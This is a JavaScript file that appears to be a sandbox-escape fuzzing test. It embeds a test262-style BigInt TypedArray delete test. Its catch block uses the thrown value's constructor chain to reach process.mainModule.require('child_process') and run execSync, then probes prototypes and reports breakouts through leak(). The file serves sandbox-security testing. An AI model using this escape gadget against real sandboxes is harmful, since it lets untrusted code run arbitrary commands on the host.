try {
    testWithBigIntTypedArrayConstructors(function (TA) {
        throw () => {
            return () => {
            };
        };
        var keys = [
            '1.0',
            '+1',
            '1000000000000000000000',
            '0.0000001'
        ];
        keys.forEach(key => {
            var sample = new TA();
            assert.sameValue(delete sample[key], true, 'The value of `delete sample[key]` is true');
            TypedArray.prototype[key] = key;
            assert.sameValue(delete sample[key], true, 'The value of `delete sample[key]` is true');
            sample[key] = key;
            assert.sameValue(delete sample[key], true, 'The value of `delete sample[key]` is true');
            Object.defineProperty(sample, key, {
                get() {
                    return key;
                }
            });
            assert.throws(TypeError, () => {
                delete sample[key];
            }, '`delete sample[key]` throws TypeError');
            delete TypedArray.prototype[key];
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}